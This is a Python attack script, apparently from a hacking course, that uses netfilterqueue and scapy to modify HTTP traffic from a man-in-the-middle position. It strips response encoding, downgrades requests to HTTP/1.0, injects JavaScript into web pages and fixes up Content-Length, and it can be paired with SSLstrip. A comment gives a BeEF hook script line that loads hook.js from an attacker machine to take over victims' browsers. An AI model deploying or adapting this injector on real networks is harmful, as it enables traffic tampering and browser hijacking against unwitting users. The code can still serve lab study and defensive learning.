#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show())
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000: # port 10000 instead of port 80 when using this program with SSLstrip(i.e. for using thi9 attack on https websites
            print("HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) # removes the Accept-Encoding field from the request sent by
            # the client so that the response sent by the server in response to this request is in plain text(so that we can
            # read the html) and not encoded in the specified format.
            load = load.replace("HTTP/1.1", "HTTP/1.O") # we do this so that the server thinks that we cannot understand http1.1 and the reponses are
            # sent in http1.0. http1.1 sends reponses in chunks and these responses have no content-length so modifying these responses(chunks of data)
            # by injecting conde in them will cause errors and websites to not load and function properly and therefore we want the responses to sent in
            # http1.0 which does not send data in chunks.
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("HTTTP Response")
            # print(scapy_packet.show())
            injection_code = "<script>alert('test');</script>" #<script src="http://10.0.2.15:3000/hook.js"></script> use this script
            #to hook the clients on BEeF and insert your kali machine IP in place of 10.0.2.15
            # above is the script to be injected and executed in the clients browser.
            load = load.replace("</body>", injection_code + "</body>") # replacing the </body> tag in the response(as it is now plain
            #text the replace function can find this) with our script + </body> tag so that our script gets attached at the end of
            # the html code so that the website loads first and loads even if our script fails to execute. This also reduces the loading
            # time of the website at the client side in comparison to inserting the script in between or at the top of the html code.
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load) # searching the value of Content-Length field from
            # the response of the server.
            if content_length_search and "text/html" in load:   # executes the following code only if the content length argument is
                #present and also ensures that this packet contains html code as packets might also contain css code and scripts and
                #we don't want to endup modifying those
                content_length = content_length_search.group(1) # using 0 in place of 1 would have returned the string  "Content-Length: xxxx"
                #instead of returning just the value of the Content-Length field which we want to modify
                new_content_length = int(content_length) + len(injection_code) #type casting the content_length variable to int as it is a string
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load: #executes only if the load was modified.
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

0
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()